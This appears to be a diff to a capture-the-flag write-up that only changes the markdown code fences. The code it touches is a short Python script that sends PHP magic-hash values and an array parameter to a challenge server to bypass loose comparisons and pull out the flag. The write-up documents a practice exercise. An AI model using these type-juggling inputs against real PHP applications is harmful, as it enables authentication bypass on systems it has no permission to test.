@@ -6,7 +6,7 @@
 
 I had previously seen this type of challenges. So I better started creating automated script using python. The used code is-
 
-`
+```
 import requests, re
 headers = {'User-agent': 'Yes, I am a human.', 'Sagarmatha-Hacktoberfest-CTF': 'https://hacktober.tk/'}
 params = {'ctf':'0e215962017', 'parm': '240610708', 'mrap': 'QNKCDZO'}
@@ -15,6 +15,6 @@ r = requests.post("https://php.0daygod.xyz/?hello=hi&world=0X10001&nice[]=a&ecin
 flag_list = re.findall('hacktoberfest_ctf{.*?}', r.text)
 
 print(flag_list[-1])
-`
+```
 
 Run this and got the flag ;p
